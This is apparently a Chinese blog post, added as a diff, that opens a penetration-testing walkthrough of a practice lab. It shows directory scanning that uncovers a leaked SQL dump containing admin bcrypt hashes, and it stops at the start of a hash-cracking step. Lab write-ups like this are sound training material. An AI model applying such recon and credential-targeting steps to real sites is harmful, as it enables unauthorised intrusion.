@@ -1,0 +1,923 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chiya-66">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="tips：以下所有操作均在靶场内进行，仅供各位师傅进行参考 阶段一：外网渗透打开靶场，可以看到是一个公司官网，并不能获取到什么有效信息，所以这里需要我们进行一下信息收集 一、信息收集老规矩，先用 dirsearch 扫描一下，看看有没有重要数据泄露这里我们可以看到重要文件 database .sql泄露，下载并打开 12345678910111213141516171819202122232425">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【外网+内网】从靶场入手，全方位为你讲解如何进行渗透测试">
+<meta property="og:url" content="https://chiya-66.github.io/2026/10/26/%E5%A4%96%E7%BD%91%E4%B8%8E%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:site_name" content="Chiya 的博客">
+<meta property="og:description" content="tips：以下所有操作均在靶场内进行，仅供各位师傅进行参考 阶段一：外网渗透打开靶场，可以看到是一个公司官网，并不能获取到什么有效信息，所以这里需要我们进行一下信息收集 一、信息收集老规矩，先用 dirsearch 扫描一下，看看有没有重要数据泄露这里我们可以看到重要文件 database .sql泄露，下载并打开 12345678910111213141516171819202122232425">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/169168232/a95c93c3ee6b4c4683b3f08a9e616e6d.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/169168232/8db7fccb7668426fa3da017a7c45c3d1.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/169168232/c71c9c88620f4644a08a66bbfea22d45.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/169168232/d980efe05aa34c848a46812f705e756c.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/169168232/14d777964af84bf98316fabce0cc1562.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/169168232/610bf25f605240b69164b7b146e3ad41.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/169168232/682b0609ac954c029d4fb4bd43e19c1f.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/169168232/83a4f295ce85403ba2a94eae2e51ea43.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/169168232/d9cb054c7c7d4fee8cb42ba0737c7031.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/169168232/b8c6d37f8bba43c892da6a871932f1be.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/169168232/086637f02eb148e69f27b337503dca2e.png">
+<meta property="article:published_time" content="2026-10-26T13:22:24.000Z">
+<meta property="article:modified_time" content="2026-11-07T11:18:32.671Z">
+<meta property="article:author" content="chiya-66">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="外网渗透">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://chiya-66.github.io/images/csdn/169168232/a95c93c3ee6b4c4683b3f08a9e616e6d.png">
+  
+  
+  
+  <title>【外网+内网】从靶场入手，全方位为你讲解如何进行渗透测试 - Chiya 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chiya-66.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Chiya 的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="【外网+内网】从靶场入手，全方位为你讲解如何进行渗透测试"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-10-26 21:22" pubdate>
+          2026年10月26日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          79 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">【外网+内网】从靶场入手，全方位为你讲解如何进行渗透测试</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>tips：以下所有操作均在靶场内进行，仅供各位师傅进行参考</strong></p>
+<h2 id="阶段一：外网渗透"><a href="#阶段一：外网渗透" class="headerlink" title="阶段一：外网渗透"></a>阶段一：外网渗透</h2><p>打开靶场，可以看到是一个公司官网，并不能获取到什么有效信息，所以这里需要我们进行一下信息收集<br><img src="/images/csdn/169168232/a95c93c3ee6b4c4683b3f08a9e616e6d.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><p>老规矩，先用 dirsearch 扫描一下，看看有没有重要数据泄露<br><img src="/images/csdn/169168232/8db7fccb7668426fa3da017a7c45c3d1.png" srcset="/img/loading.gif" lazyload><br>这里我们可以看到重要文件 database .sql泄露，下载并打开</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- MySQL dump 10.13  Distrib 5.7.35, for Linux (x86_64)</span><br><span class="hljs-comment">--</span><br><span class="hljs-comment">-- Host: localhost    Database: cms_database</span><br><span class="hljs-comment">-- ------------------------------------------------------</span><br><br><span class="hljs-comment">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */</span>;<br><span class="hljs-comment">/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */</span>;<br><span class="hljs-comment">/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */</span>;<br><span class="hljs-comment">/*!40101 SET NAMES utf8 */</span>;<br><span class="hljs-comment">/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */</span>;<br><span class="hljs-comment">/*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */</span>;<br><span class="hljs-comment">/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */</span>;<br><span class="hljs-comment">/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */</span>;<br><span class="hljs-comment">/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#x27;NO_AUTO_VALUE_ON_ZERO&#x27; */</span>;<br><span class="hljs-comment">/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */</span>;<br><br><span class="hljs-comment">--</span><br><span class="hljs-comment">-- Table structure for table `admins`</span><br><span class="hljs-comment">--</span><br><br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `admins`;<br><span class="hljs-comment">/*!40101 SET @saved_cs_client     = @@character_set_client */</span>;<br><span class="hljs-comment">/*!40101 SET character_set_client = utf8 */</span>;<br><span class="hljs-keyword">CREATE TABLE</span> `admins` (<br>  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT NULL</span> AUTO_INCREMENT,<br>  `username` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT NULL</span>,<br>  `password_hash` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT NULL</span>, <span class="hljs-comment">-- 使用password_hash()加密</span><br>  `email` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `role` enum(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;auditor&#x27;</span>) <span class="hljs-keyword">NOT NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;auditor&#x27;</span>,<br>  `created_at` <span class="hljs-type">timestamp</span> <span class="hljs-keyword">NOT NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,<br>  `updated_at` <span class="hljs-type">timestamp</span> <span class="hljs-keyword">NOT NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,<br>  <span class="hljs-keyword">PRIMARY KEY</span> (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `username` (`username`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `email` (`email`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB AUTO_INCREMENT<span class="hljs-operator">=</span><span class="hljs-number">3</span> <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4;<br><span class="hljs-comment">/*!40101 SET character_set_client = @saved_cs_client */</span>;<br><br><span class="hljs-comment">--</span><br><span class="hljs-comment">-- Dumping data for table `admins`</span><br><span class="hljs-comment">--</span><br><br>LOCK TABLES `admins` WRITE;<br><span class="hljs-comment">/*!40000 ALTER TABLE `admins` DISABLE KEYS */</span>;<br><span class="hljs-keyword">INSERT INTO</span> `admins` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;security_audit&#x27;</span>,<span class="hljs-string">&#x27;$2y$10$Rt7qZwqYOLWFZCEHfThGXudOpl/K3KVx50krQSA1kT3xw1cc7JFF2&#x27;</span>,<span class="hljs-string">&#x27;audit@example.com&#x27;</span>,<span class="hljs-string">&#x27;auditor&#x27;</span>,NOW(),NOW());<br><span class="hljs-keyword">INSERT INTO</span> `admins` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;$2y$10$bZdU0ipfQyWmOi1BW72GH.cGywpeawymx6.Z41g.PHZNGsav/KVq.&#x27;</span>,<span class="hljs-string">&#x27;admin@example.com&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,NOW(),NOW());<br><span class="hljs-comment">/*!40000 ALTER TABLE `admins` ENABLE KEYS */</span>;<br>UNLOCK TABLES;<br><br><span class="hljs-comment">--</span><br><span class="hljs-comment">-- Table structure for table `articles`</span><br><span class="hljs-comment">--</span><br><br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `articles`;<br><span class="hljs-comment">/*!40101 SET @saved_cs_client     = @@character_set_client */</span>;<br><span class="hljs-comment">/*!40101 SET character_set_client = utf8 */</span>;<br><span class="hljs-keyword">CREATE TABLE</span> `articles` (<br>  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT NULL</span> AUTO_INCREMENT,<br>  `title` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT NULL</span>,<br>  `content` text <span class="hljs-keyword">NOT NULL</span>,<br>  `author_id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT NULL</span>,<br>  `category` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `status` enum(<span class="hljs-string">&#x27;draft&#x27;</span>,<span class="hljs-string">&#x27;published&#x27;</span>,<span class="hljs-string">&#x27;archived&#x27;</span>) <span class="hljs-keyword">NOT NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;draft&#x27;</span>,<br>  `created_at` <span class="hljs-type">timestamp</span> <span class="hljs-keyword">NOT NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,<br>  `updated_at` <span class="hljs-type">timestamp</span> <span class="hljs-keyword">NOT NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,<br>  <span class="hljs-keyword">PRIMARY KEY</span> (`id`),<br>  KEY `author_id` (`author_id`),<br>  KEY `category` (`category`),<br>  <span class="hljs-keyword">CONSTRAINT</span> `articles_ibfk_1` <span class="hljs-keyword">FOREIGN KEY</span> (`author_id`) <span class="hljs-keyword">REFERENCES</span> `admins` (`id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4;<br><span class="hljs-comment">/*!40101 SET character_set_client = @saved_cs_client */</span>;<br><br><span class="hljs-comment">--</span><br><span class="hljs-comment">-- Table structure for table `templates`</span><br><span class="hljs-comment">--</span><br><br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `templates`;<br><span class="hljs-comment">/*!40101 SET @saved_cs_client     = @@character_set_client */</span>;<br><span class="hljs-comment">/*!40101 SET character_set_client = utf8 */</span>;<br><span class="hljs-keyword">CREATE TABLE</span> `templates` (<br>  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT NULL</span> AUTO_INCREMENT,<br>  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT NULL</span>,<br>  `path` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT NULL</span>,<br>  `description` text,<br>  `is_active` tinyint(<span class="hljs-number">1</span>) <span class="hljs-keyword">NOT NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span>,<br>  `created_at` <span class="hljs-type">timestamp</span> <span class="hljs-keyword">NOT NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,<br>  `updated_at` <span class="hljs-type">timestamp</span> <span class="hljs-keyword">NOT NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,<br>  <span class="hljs-keyword">PRIMARY KEY</span> (`id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4;<br><span class="hljs-comment">/*!40101 SET character_set_client = @saved_cs_client */</span>;<br><br><span class="hljs-comment">--</span><br><span class="hljs-comment">-- Table structure for table `system_logs`</span><br><span class="hljs-comment">--</span><br><br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `system_logs`;<br><span class="hljs-comment">/*!40101 SET @saved_cs_client     = @@character_set_client */</span>;<br><span class="hljs-comment">/*!40101 SET character_set_client = utf8 */</span>;<br><span class="hljs-keyword">CREATE TABLE</span> `system_logs` (<br>  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT NULL</span> AUTO_INCREMENT,<br>  `user_id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `action` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT NULL</span>,<br>  `description` text <span class="hljs-keyword">NOT NULL</span>,<br>  `ip_address` <span class="hljs-type">varchar</span>(<span class="hljs-number">45</span>) <span class="hljs-keyword">NOT NULL</span>,<br>  `user_agent` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT NULL</span>,<br>  `created_at` <span class="hljs-type">timestamp</span> <span class="hljs-keyword">NOT NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,<br>  <span class="hljs-keyword">PRIMARY KEY</span> (`id`),<br>  KEY `user_id` (`user_id`),<br>  <span class="hljs-keyword">CONSTRAINT</span> `system_logs_ibfk_1` <span class="hljs-keyword">FOREIGN KEY</span> (`user_id`) <span class="hljs-keyword">REFERENCES</span> `admins` (`id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4;<br><span class="hljs-comment">/*!40101 SET character_set_client = @saved_cs_client */</span>;<br><br><span class="hljs-comment">--</span><br><span class="hljs-comment">-- Table structure for table `article_views`</span><br><span class="hljs-comment">--</span><br><br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `article_views`;<br><span class="hljs-comment">/*!40101 SET @saved_cs_client     = @@character_set_client */</span>;<br><span class="hljs-comment">/*!40101 SET character_set_client = utf8 */</span>;<br><span class="hljs-keyword">CREATE TABLE</span> `article_views` (<br>  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT NULL</span> AUTO_INCREMENT,<br>  `article_id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT NULL</span>,<br>  `ip_address` <span class="hljs-type">varchar</span>(<span class="hljs-number">45</span>) <span class="hljs-keyword">NOT NULL</span>,<br>  `user_agent` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT NULL</span>,<br>  `viewed_at` <span class="hljs-type">timestamp</span> <span class="hljs-keyword">NOT NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,<br>  <span class="hljs-keyword">PRIMARY KEY</span> (`id`),<br>  KEY `article_id` (`article_id`),<br>  <span class="hljs-keyword">CONSTRAINT</span> `article_views_ibfk_1` <span class="hljs-keyword">FOREIGN KEY</span> (`article_id`) <span class="hljs-keyword">REFERENCES</span> `articles` (`id`) <span class="hljs-keyword">ON</span> <span class="hljs-keyword">DELETE</span> CASCADE<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4;<br><span class="hljs-comment">/*!40101 SET character_set_client = @saved_cs_client */</span>;<br><br><span class="hljs-comment">-- Dump completed on 2023-06-01 12:34:56 </span><br></code></pre></td></tr></table></figure>
+
+<h3 id="二、hash破解"><a href="#二、hash破解" class="headerlink" title="二、hash破解"></a>二、hash破解</h3><p>这里可以看到审计员security_audit账号和密码的hash值被泄露</p>
